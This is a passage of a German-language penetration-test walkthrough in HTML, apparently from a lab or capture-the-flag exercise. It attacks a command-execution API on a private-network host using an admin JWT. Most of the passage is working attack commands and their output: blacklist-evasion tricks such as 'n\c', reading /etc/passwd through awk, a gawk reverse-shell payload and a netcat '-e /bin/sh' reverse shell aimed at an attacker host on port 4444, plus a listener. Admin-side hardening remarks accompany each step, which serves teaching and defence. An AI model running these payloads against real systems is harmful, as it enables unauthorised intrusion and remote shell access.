+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass alle Befehle, die als URL-Parameter übergeben werden, korrekt URL-kodiert sind. Die Shell könnte hier dazwischenfunken. Es ist oft besser, den zu kodierenden String zuerst in eine Variable zu schreiben und dann die Variable zu verwenden oder ein Skript für die Kodierung zu nutzen.
+<br><strong>Empfehlung (Admin):</strong> Input Validierung auf Serverseite sollte auch mit korrekt URL-kodierten Payloads umgehen können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -g -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" "http://192.168.2.205:3000/execute?cmd=grep sh /etc/passwd"</span></div>
+                    <pre><span class="password">curl: (3) URL rejected: Malformed input to a URL function</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich korrigiere den vorherigen Versuch, indem ich die Leerzeichen URL-kodiere (`%20`). Der Befehl ist jetzt `grep%20sh%20/etc/passwd`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl wird jetzt vom Server verarbeitet, aber vom `COMMAND_FILTER` blockiert: `{"status":"rejected","data":"this command is unsafe"}`. Dies liegt daran, dass `grep` und `sh` beide auf der Blacklist stehen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt, dass der Filter auch URL-kodierte Befehle korrekt prüft. Ich muss nach Befehlen suchen, die *nicht* auf der Blacklist sind, um Informationen zu sammeln oder Aktionen auszuführen.
+<br><strong>Empfehlung (Admin):</strong> Der Filter greift, aber die zugrundeliegende Schwäche der Blacklist-Strategie bleibt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -g -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" "http://192.168.2.205:3000/execute?cmd=grep%20sh%20/etc/passwd"</span></div>
+                    <pre><span class="password">{"status":"rejected","data":"this command is unsafe"}</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche den Befehl `find . -maxdepth 1` (URL-kodiert: `find%20.%20-maxdepth%201`), um den Inhalt des aktuellen Verzeichnisses auf dem Server aufzulisten, in dem der Node.js-Prozess läuft. `find` ist nicht explizit auf der Blacklist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Erfolg!</span> Der Befehl wird ausgeführt: `{"status":"executed","data":{"stdout":".\n./public\n./node_modules\n./server.js\n./nodemon.json\n./index.html\n./pnpm-lock.yaml\n./.env\n./.pnpm-store\n./src\n./package.json\n./vite.config.js\n./.env.bak\n./README.md\n","stderr":""}}`.
+Dies listet den Inhalt des Projekt-Root-Verzeichnisses auf. Wir sehen bekannte Dateien wie `server.js`, `.env`, `package.json`, aber auch eine interessante Datei `.env.bak` (Backup der .env Datei).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datei `.env.bak` könnte andere oder ältere Informationen als die bereits geleakte `.env`-Datei enthalten und sollte untersucht werden (z.B. mit einem weiteren `find` und einem Lesebefehl, der nicht gefiltert wird). Die Auflistung bestätigt, dass wir uns im Hauptverzeichnis der Anwendung befinden.
+<br><strong>Empfehlung (Admin):</strong> Der Befehl `find` ist sehr mächtig und sollte auf einer Blacklist für einen Web-API-Ausführungsendpunkt definitiv enthalten sein. Backup-Dateien (wie `.env.bak`) sollten niemals im selben Verzeichnis oder überhaupt im Web-Root liegen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -g -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" "http://192.168.2.205:3000/execute?cmd=find%20.%20-maxdepth%201"</span></div>
+                    <pre><span class="password">{"status":"executed","data":{"stdout":".\n./public\n./node_modules\n./server.js\n./nodemon.json\n./index.html\n./pnpm-lock.yaml\n./.env\n./.pnpm-store\n./src\n./package.json\n./vite.config.js\n./.env.bak\n./README.md\n","stderr":""}}</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich teste weiter nach verfügbaren Interpretern: `which ruby`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ähnlich wie bei Perl, wird der Befehl `which ruby` ausgeführt, aber Ruby wird nicht gefunden: `{"status":"executed","data":"Command failed: which ruby\n"}`. Ruby ist also wahrscheinlich nicht verfügbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ruby ist keine Option.
+<br><strong>Empfehlung (Admin):</strong> Minimalinstallation.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -g -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" "http://192.168.2.205:3000/execute?cmd=which%20ruby"</span></div>
+                    <pre><span class="password">{"status":"executed","data":"Command failed: which ruby\n"}</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nächster Test: `which php`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> PHP wird ebenfalls nicht gefunden: `{"status":"executed","data":"Command failed: which php\n"}`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> PHP ist keine Option.
+<br><strong>Empfehlung (Admin):</strong> Minimalinstallation.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -g -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" "http://192.168.2.205:3000/execute?cmd=which%20php"</span></div>
+                    <pre><span class="password">{"status":"executed","data":"Command failed: which php\n"}</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich teste `which awk`. `awk` ist ein mächtiges Textverarbeitungstool, das in einigen Varianten auch Netzwerkfähigkeiten besitzt (insbesondere GNU awk oder gawk).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Bingo!</span> `awk` ist verfügbar unter `/usr/bin/awk`: `{"status":"executed","data":{"stdout":"/usr/bin/awk\n","stderr":""}}`. `awk` steht nicht auf der Blacklist. Dies könnte ein Weg sein, eine Reverse Shell zu bekommen, wenn es sich um eine Version mit Netzwerkunterstützung handelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `awk` ist ein vielversprechender Kandidat für eine Reverse Shell. Ich muss einen `awk`-basierten Reverse-Shell-Payload finden und URL-kodieren.
+<br><strong>Empfehlung (Admin):</strong> `awk` ist ein Standard-Unix-Tool. Es von Servern zu entfernen, ist oft nicht praktikabel. Wenn Befehlsausführung über eine Web-API erlaubt ist, ist die Umgehung von Blacklists oft nur eine Frage der Zeit. Die API selbst ist das Problem.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -g -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" "http://192.168.2.205:3000/execute?cmd=which%20awk"</span></div>
+                    <pre><span class="password">{"status":"executed","data":{"stdout":"/usr/bin/awk\n","stderr":""}}</span></pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich erstelle einen `awk`-Reverse-Shell-Payload. Der `awk`-Code `BEGIN {s = "/inet/tcp/0/192.168.2.199/4444"; while(42) { do{ printf "awk-shell>" |& s; s |& getline c; if(c){ system(c); } } while(c != "exit") close(s); }}` versucht, eine TCP-Verbindung zu meinem Angreifer-Host `192.168.2.199` auf Port `4444` herzustellen und dann eine einfache interaktive Shell bereitzustellen. Dieser Payload wird dann mit `python3 -c "import urllib.parse; ... print(urllib.parse.quote(payload))"` URL-kodiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Python-Befehl generiert den URL-kodierten Payload: `awk%20%27BEGIN%20%7Bs%20%3D%20%22/inet/tcp/0/192.168.2.199/4444%22%3B%20while%2842%29%20%7B%20do%7B%20printf%20%22awk-shell%3E%22%20%7C%26%20s%3B%20s%20%7C%26%20getline%20c%3B%20if%28c%29%7B%20system%28c%29%3B%20%7D%<br>20%7D%20while%28c%20%21%3D%20%22exit%22%29%20close%28s%29%3B%20%7D%7D%27`. Dies ist der Payload, den ich über den `/execute`-Endpunkt senden werde. Der `/inet/tcp/...`-Syntax ist typisch für `gawk` (GNU awk).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Auf meiner Angreifer-Maschine muss ich jetzt einen Listener auf Port `4444` starten (`nc -lvnp 4444`), bevor ich den Payload sende.
+<br><strong>Empfehlung (Admin):</strong> Wenn `gawk` mit Netzwerkfunktionen auf dem System ist und `awk` nicht auf der Blacklist steht, ist dies ein valider Umgehungsversuch. Wiederum zeigt dies die Schwäche von Blacklists.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">python3 -c "import urllib.parse; payload = \"awk 'BEGIN {s = \\\"/inet/tcp/0/192.168.2.199/4444\\\"; while(42) { do{ printf \\\"awk-shell>\\\" |& s; s |& getline c; if(c){ system(c); } } while(c != \\\"exit\\\") close(s); }}'\"; print(urllib.parse.quote(payload))"</span></div>
+                    <pre>awk%20%27BEGIN%20%7Bs%20%3D%20%22/inet/tcp/0/192.168.2.199/4444%22%3B%20while%2842%29%20%7B%20do%7B%20printf%20%22awk-shell%3E%22%20%7C%26%20s%3B%20s%20%7C%26%20getline%20c%3B%20if%28c%29%7B%20system%28c%29%3B%20%7D%20%7D%20while%28c%20%21%3D%20%22exit%22%29%20close%28s%29%3B%20%7D%7D%27</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich starte einen Netcat-Listener auf meinem Angreifer-Rechner (Kali) auf Port `4444`, um die eingehende Reverse-Shell-Verbindung vom Zielsystem abzufangen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Listener ist bereit (`listening on [any] 4444 ...`). Jetzt muss der `awk`-Payload auf dem Zielsystem erfolgreich ausgeführt werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sobald der Listener läuft, den `curl`-Befehl mit dem URL-kodierten `awk`-Payload an den `/execute`-Endpunkt des Zielsystems senden.
+<br><strong>Empfehlung (Admin):</strong> Ausgehende Verbindungen vom Server sollten, wenn möglich, auf bekannte und notwendige Ziele und Ports beschränkt werden (Egress-Filtering). Dies kann die Erfolgschancen von Reverse Shells reduzieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>listening on [any] 4444 ...</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich sende den URL-kodierten `awk`-Reverse-Shell-Payload mit `curl` an den `/execute`-Endpunkt. Der Admin-Token ist in der Variable `$ADMIN_TOKEN` und der Payload in `$AWK_PAYLOAD_ENCODED` gespeichert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Leider ein Fehlschlag.</span> Der Server antwortet mit `{"status":"rejected","data":"this command is unsafe"}`. Obwohl `awk` selbst nicht auf der Blacklist steht, scheint ein Teil des `awk`-Payloads oder die Art, wie er interpretiert wird, den `COMMAND_FILTER` auszulösen. Möglicherweise sind es die speziellen Zeichen im `awk`-Skript (`|&`, `{`, `}`), auch wenn sie URL-kodiert sind, oder die Art, wie Node.js Kindprozesse startet, interpretiert den String so, dass doch problematische Zeichen erkannt werden. Die Blacklist verbietet explizit `|`, `&`, `<`, `>`. Das `|&` im `awk`-Payload für die Netzwerkkommunikation könnte das Problem sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der `awk`-Payload war zu komplex oder enthielt gefilterte Zeichen. Ich muss einen anderen Weg finden oder einen einfacheren `awk`-Befehl verwenden, der keine gefilterten Zeichen benötigt. Vielleicht kann ich `awk` nur zum Lesen von Dateien verwenden und einen anderen Weg für die Shell suchen. Alternativ könnte ich versuchen, die problematischen Zeichen im `awk`-Payload weiter zu obfuskieren oder zu kodieren (z.B. oktal/hex innerhalb von `awk`).
+<br><strong>Empfehlung (Admin):</strong> Dies zeigt, dass selbst wenn ein Tool (`awk`) nicht auf der Blacklist steht, die Argumente oder der übergebene Code dennoch gefiltert werden können. Die Filterlogik (`is_safe_command`) scheint also auch den Inhalt des `cmd`-Parameters zu untersuchen. Dennoch bleiben Blacklists fehleranfällig.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" # Dein Admin-Token</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">AWK_PAYLOAD_ENCODED="awk%20%27BEGIN%20%7Bs%20%3D%20%22/inet/tcp/0/192.168.2.199/4444%22%3B%20while%2842%29%20%7B%20do%7B%20printf%20%22awk-shell%3E%22%20%7C%26%20s%3B%20s%20%7C%26%20getline%20c%3B%20if%28c%29%7B%20system%28c%29%3B%20%7D%20%7D%20while%28c%20%21%3D%20%22exit%22%29%20close%28s%29%3B%20%7D%7D%27"</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -g -H "Authorization: Bearer $ADMIN_TOKEN" "http://192.168.2.205:3000/execute?cmd=$AWK_PAYLOAD_ENCODED"</span></div>
+                    <pre><span class="password">{"status":"rejected","data":"this command is unsafe"}</span></pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Da der komplexe `awk`-Reverse-Shell-Payload blockiert wurde, versuche ich einen einfacheren `awk`-Befehl, um zu bestätigen, dass `awk` grundsätzlich für Dateizugriffe funktioniert und um sensible Dateien zu lesen. Hier versuche ich, `/etc/passwd` mit `awk '{print}' /etc/passwd` (URL-kodiert: `awk%20%27{print}%27%20/etc/passwd`) auszulesen. Der Output wird durch `jq -r '.data.stdout'` geparsed, um nur den stdout-Inhalt der JSON-Antwort zu erhalten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Das funktioniert!</span> Der Inhalt von `/etc/passwd` wird erfolgreich ausgegeben. Dies bestätigt, dass `awk` für Dateileseoperationen verwendet werden kann und die Filter (`COMMAND_FILTER` und `is_safe_command`) diesen einfachen `awk`-Aufruf nicht blockieren. Die `/etc/passwd`-Datei listet die Benutzer des Systems auf, einschließlich `runner`, `hana` und `gitea`, die interessante Shells wie `/bin/sh` haben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich kann `awk` verwenden, um beliebige Dateien zu lesen, auf die der `runner`-Benutzer Zugriff hat. Dies ist sehr nützlich für die weitere Enumeration. Ich sollte nach SSH-Keys, Konfigurationsdateien, Skripten oder anderen sensiblen Informationen in den Home-Verzeichnissen der Benutzer (besonders `/home/hana`) suchen.
+<br><strong>Empfehlung (Admin):</strong> Auch wenn der `awk`-Reverse-Shell-Payload blockiert wurde, zeigt dies, dass der `COMMAND_FILTER` immer noch umgangen werden kann, um zumindest sensitive Informationen auszulesen. Der Zugriff auf beliebige Befehlsausführung über eine Web-API ist inhärent unsicher.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" # Dein Admin-Token (sollte noch in der Variable sein)</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">PAYLOAD_ETC_PASSWD_AWK="awk%20%27{print}%27%20/etc/passwd"</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -s -g -H "Authorization: Bearer $ADMIN_TOKEN" "http://192.168.2.205:3000/execute?cmd=$PAYLOAD_ETC_PASSWD_AWK" | jq -r '.data.stdout'</span></div>
+                    <pre><span class="command">root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+klogd:x:100:101:klogd:/dev/null:/sbin/nologin
+chrony:x:101:102:chrony:/var/log/chrony:/sbin/nologin
+runner:x:1000:1000:::/bin/sh
+hana:x:1001:100::/home/hana:/bin/sh
+gitea:x:102:82:gitea:/var/lib/gitea:/bin/sh</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, mit `find /home/hana -type f` (URL-kodiert: `find%20/home/hana%20-type%20f`) alle Dateien im Home-Verzeichnis des Benutzers `hana` aufzulisten. Der Benutzer `runner`, als der meine Befehle ausgeführt werden, hat möglicherweise keine Leserechte auf `/home/hana`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl `find` selbst wird nicht blockiert, aber die Ausführung schlägt fehl mit `{"status":"executed","data":"Command failed: find /home/hana -type f\nfind: /home/hana: Permission denied\n"}`. Dies bedeutet, dass der Benutzer `runner` keine Berechtigung hat, das Verzeichnis `/home/hana` zu durchsuchen. Das ist eine übliche Sicherheitsmaßnahme (Benutzer können nicht in die Home-Verzeichnisse anderer Benutzer schauen).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich muss nach anderen Wegen suchen, um Informationen zu erlangen oder meine Rechte zu erweitern. Das Lesen von `/home/hana` als `runner` ist nicht direkt möglich. Ich brauche eine funktionierende Reverse Shell, um das System interaktiver zu untersuchen.
+<br><strong>Empfehlung (Admin):</strong> Korrekte Dateiberechtigungen sind wichtig. Standardmäßig sollten Home-Verzeichnisse so konfiguriert sein (z.B. `chmod 700` oder `chmod 750` mit Gruppenzugehörigkeit), dass andere nicht-privilegierte Benutzer keinen Zugriff haben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" # Sicherstellen, dass es gesetzt ist!</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">PAYLOAD_FIND_HANA="find%20/home/hana%20-type%20f"</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -s -g -H "Authorization: Bearer $ADMIN_TOKEN" "http://192.168.2.205:3000/execute?cmd=$PAYLOAD_FIND_HANA"</span></div>
+                    <pre><span class="password">{"status":"executed","data":"Command failed: find /home/hana -type f\nfind: /home/hana: Permission denied\n"}</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nachdem der `awk`-Reverse-Shell-Versuch fehlschlug und `nc` auf der Blacklist steht, suche ich nach Variationen von `nc`. Der Befehl `which n\c` (das `\` dient hier als Escape-Zeichen in der lokalen Shell, um zu verhindern, dass `c` als Teil eines Aliases interpretiert wird, ist aber für den `curl`-Aufruf und den Server irrelevant, da `cmd=which%20n\c` gesendet wird) prüft, ob `nc` unter diesem Namen existiert. Es ist ein Versuch, ob einfache Obfuskation den Filter umgeht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Interessanterweise wird `nc` gefunden!</span> `{"status":"executed","data":{"stdout":"/usr/bin/nc\n","stderr":""}}`. Dies deutet darauf hin, dass der `COMMAND_FILTER` möglicherweise `nc` als ganzes Wort blockiert, aber nicht Variationen wie `n\c`, wenn diese vom ausführenden System (Node.js `exec`) letztendlich doch als `nc` interpretiert werden oder der Filter nicht robust genug ist. Wahrscheinlicher ist, dass der Filter `nc` als Wort filtert, aber der `\c` Teil den String so verändert, dass der Filter `nc` nicht mehr matcht, aber die Shell auf dem Zielsystem `n\c` trotzdem als `nc` ausführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist ein Durchbruch für die Reverse Shell! Wenn `n\c` ausgeführt werden kann und als `nc` interpretiert wird, kann ich versuchen, einen `nc`-Reverse-Shell-Payload mit `n\c` zu erstellen.
+<br><strong>Empfehlung (Admin):</strong> Der `COMMAND_FILTER` ist definitiv zu simpel. Er sollte robuste String-Vergleiche und Normalisierungen durchführen, um solche einfachen Umgehungsversuche zu verhindern. Escape-Sequenzen und alternative Schreibweisen müssen berücksichtigt werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -s -g -H "Authorization: Bearer $ADMIN_TOKEN" "http://192.168.2.205:3000/execute?cmd=which%20n\c"</span></div>
+                    <pre><span class="password">{"status":"executed","data":{"stdout":"/usr/bin/nc\n","stderr":""}}</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Hier wird ein Versuch skizziert, eine Reverse Shell mit dem obfuskierten `n\c` zu erstellen: `REVERSE_SHELL_PAYLOAD_ENCODED="n%5Cc%20192.168.2.199%204444%20-e%20/bin/sh"`. Das `%5C` ist die URL-Kodierung für `\`. `-e /bin/sh` würde Netcat anweisen, nach erfolgreicher Verbindung `/bin/sh` auszuführen und dessen Ein-/Ausgabe über die Netzwerkverbindung zu leiten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein theoretischer Payload. Der Erfolg hängt davon ab, ob die serverseitige Shell `n\c` als `nc` interpretiert UND ob die verwendete `nc`-Version die `-e` Option unterstützt (traditionelles `nc` tut dies oft, OpenBSD `nc` nicht ohne Weiteres, aber BusyBox `nc` kann es, wenn entsprechend kompiliert).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diesen Payload ausprobieren, nachdem ein Listener auf Port 4444 gestartet wurde.
+<br><strong>Empfehlung (Admin):</strong> Wenn `nc -e` funktioniert, ist dies eine kritische Lücke. Die `-e` Option von Netcat ist berüchtigt dafür, leicht Backdoors zu erstellen. Einige Systeme verwenden restriktivere `nc`-Versionen oder entfernen die `-e` Funktionalität.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>ADMIN_TOKEN="DEIN_ADMIN_TOKEN"
+# Ersetze IP und Port mit deinen Werten und encode es korrekt!
+REVERSE_SHELL_PAYLOAD_ENCODED="n%5Cc%20192.168.2.199%204444%20-e%20/bin/sh" 
+
+curl -g -H "Authorization: Bearer $ADMIN_TOKEN" "http://192.168.2.205:3000/execute?cmd=$REVERSE_SHELL_PAYLOAD_ENCODED"</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich führe den `curl`-Befehl aus, um die Reverse Shell mit dem `n\c`-Payload zu starten. Der Payload ist `n\c%20-e%20\/bin\/s\h%20192.168.2.199%204444`. Hier sind die Slashes in `/bin/sh` URL-kodiert als `\/` (obwohl `/` in Pfaden normalerweise kein Problem ist, ist es hier `%2F`). `%20` für Leerzeichen. `n\c` wird als `n\c` gesendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl wird vom Server ausgeführt (`"status":"executed"`), aber die `nc`-Ausgabe zeigt die Hilfe/Usage-Informationen. `Command failed: n\\c -e \\/bin\\/s\\h 192.168.2.199 4444`. Dies bedeutet, dass `n\c` zwar als `nc` erkannt wurde, aber die Argumente oder die Syntax nicht korrekt waren oder die Version von `nc` (BusyBox v1.37.0) die `-e`-Option in dieser Form nicht akzeptiert oder es ein anderes Problem mit dem Payload gab. Es hat keine Shell aufgebaut.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die BusyBox-Version von `nc` kann knifflig sein. Die Option `-e` muss oft die letzte sein. Ich muss die Syntax für BusyBox `nc` genau prüfen. Es könnte auch sein, dass der `COMMAND_FILTER` immer noch Teile des Befehls (`/bin/sh` wegen `sh`?) blockiert, obwohl `n\c` durchging. Das `-e` ist das wahrscheinlichste Problem.
+<br><strong>Empfehlung (Admin):</strong> BusyBox-Utilities haben manchmal leicht abweichende Syntax oder Optionen im Vergleich zu ihren GNU-Pendants. Wenn ein Filter umgangen wird, ist es wichtig zu verstehen, welche Binaries auf dem System sind und welche Optionen sie unterstützen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" # Sicherstellen, dass es gesetzt ist!</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">PAYLOAD_FIND_HANA="find%20/home/hana%20-type%20f"</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -s -g -H "Authorization: Bearer $ADMIN_TOKEN" "http://192.168.2.205:3000/execute?cmd=n\c%20-e%20\/bin\/s\h%20192.168.2.199%204444"</span></div>
+                    <pre><span class="password">{"status":"executed","data":"Command failed: n\\c -e \\/bin\\/s\\h 192.168.2.199 4444\nBusyBox v1.37.0 (2025-01-17 18:12:01 UTC) multi-call binary.\n\nUsage: nc [OPTIONS] HOST PORT  - connect\nnc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen\n\n\t-e PROG\tRun PROG after connect (must be last)\n\t-l\tListen mode, for inbound connects\n\t-lk\tWith -e, provides persistent server\n\t-p PORT\tLocal port\n\t-s ADDR\tLocal address\n\t-w SEC\tTimeout for connects and final net reads\n\t-i SEC\tDelay interval for lines sent\n\t-n\tDon't do DNS resolution\n\t-u\tUDP mode\n\t-b\tAllow broadcasts\n\t-v\tVerbose\n\t-o FILE\tHex dump traffic\n\t-z\tZero-I/O mode (scanning)\n"}</span></pre>
+                </div>
+            </div>
+
